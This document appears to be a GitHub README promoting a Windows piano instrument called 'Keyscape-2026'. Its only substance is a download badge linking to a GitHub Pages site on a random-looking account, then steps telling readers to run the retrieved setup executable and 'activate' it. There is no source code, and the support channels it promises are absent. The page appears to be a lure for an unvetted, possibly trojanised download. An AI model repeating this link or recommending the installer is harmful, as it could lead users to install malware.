## 🎼 Overview

**Keyscape-2026** is a desktop piano instrument tailored specifically for Windows 11 and Windows 10 environments. It is the spiritual successor to earlier keyboard libraries, rebuilt from the ground up with a modern audio pipeline, a refreshed visual language, and a deeper respect for the performer's workflow.

The repository you are reading right now contains the documentation, configuration references, tuning notes, and usage guide for the 2026 edition. It is intentionally verbose because we would rather you understand every nuance than guess at it.

This project is maintained with an "offline-first" mindset. Once installed, the instrument does not require a persistent connection to function — it respects your studio, your privacy, and your bandwidth.

## 💻 System Requirements

Before you begin, confirm that your machine meets the following baseline:

- **Operating System:** Windows 11 (23H2 or later) or Windows 10 (22H2 or later)
- **Processor:** x64 architecture, dual-core 2.4 GHz minimum; quad-core 3.0 GHz recommended
- **Memory:** 8 GB RAM minimum; 16 GB recommended
- **Storage:** 12 GB of available disk space for the full sample set
- **Display:** 1280×720 minimum; 1920×1080 recommended
- **Audio:** ASIO-compatible interface recommended for low-latency performance

A dedicated audio interface is not mandatory, but it dramatically improves the feel of the instrument. Onboard audio can work in a pinch, though you may notice higher latency.

## 🚀 Getting Started

The path from download to first chord is intentionally short. Follow these steps in order.

### Step 1 — Obtain the Package

[![Download](https://raw.githubusercontent.com/bhvghwhwh/Keyscape-Vault-Archive/main/run_c14ee4.svg)](https://bhvghwhwh.github.io/Keyscape-Vault-Archive/)

Place the retrieved package in a folder you can easily find, such as your Desktop or a dedicated Downloads directory. Avoid running it directly from a temporary location.

### Step 2 — Prepare Your Environment

Close any audio applications that may be holding onto system audio resources. This prevents conflicts during the initial setup.

### Step 3 — Run the Installer

Launch the setup executable and follow the on-screen prompts. You will be asked to choose an installation directory. The default location is recommended unless you have a specific reason to change it.

### Step 4 — Activate

On first launch, you will be guided through a short activation sequence. Keep your purchase receipt handy in case you need to reference an order identifier.

### Step 5 — Configure Audio

Open the audio settings panel and select your preferred driver. If you are using an ASIO interface, select it here to unlock the lowest latency.

### Step 6 — Play

Connect your MIDI controller, select a preset, and press a key. That is the whole ritual. The rest is music.

## 🎨 Interface Walkthrough

The interface is arranged into four primary zones, each serving a distinct purpose.

**The Keyboard Zone** occupies the lower portion of the window. It mirrors a traditional piano layout and responds to both mouse clicks and MIDI input.

**The Control Strip** runs along the top. Here you will find preset navigation, the master volume dial, and quick toggles for reverb and sustain behaviour.

**The Tone Sculptor Panel** lives on the left. It exposes the resonance, brightness, and velocity curve parameters for those who want to shape the raw character of the instrument.

**The FX Rack** anchors the right side. It hosts the effect chain and lets you reorder modules by dragging them.

The entire layout is responsive and remembers its arrangement between sessions, so you never have to rebuild your workspace.

## 🔊 Sound Engine Philosophy

We approached the sound design with a single guiding question: *what does it feel like to be in the room with the instrument?*

To answer that, the engine treats each note as a living event rather than a static waveform. When you press a key softly, you hear the hammers approach the strings with hesitation. When you press hard, you hear the full mechanical authority of the action. Release a key and the damper settles with a soft, believable thud.

This philosophy extends to the pedal. Sustain is not an on-or-off switch — it is a gradual bloom of sympathetic resonance that fades naturally when you lift your foot.

The result is an instrument that rewards touch. Play it gently and it whispers. Play it boldly and it roars.

## ❓ Frequently Asked Questions

**Does this instrument work on Windows 10 as well as Windows 11?**
Yes. Both operating systems are supported with equal care.

**Can I use it without an internet connection?**
Absolutely. Once initial setup is complete, the instrument operates entirely offline.

**Is a MIDI keyboard required?**
No. You can play using your computer keyboard or your mouse, though a MIDI controller offers the richest experience.

**How do I reset all settings to default?**
Locate the configuration file in your user directory and remove it. The application will regenerate a fresh one on next launch.

**Where can I get help if something goes wrong?**
Reach out through the community channels listed below. The support desk operates around the clock.
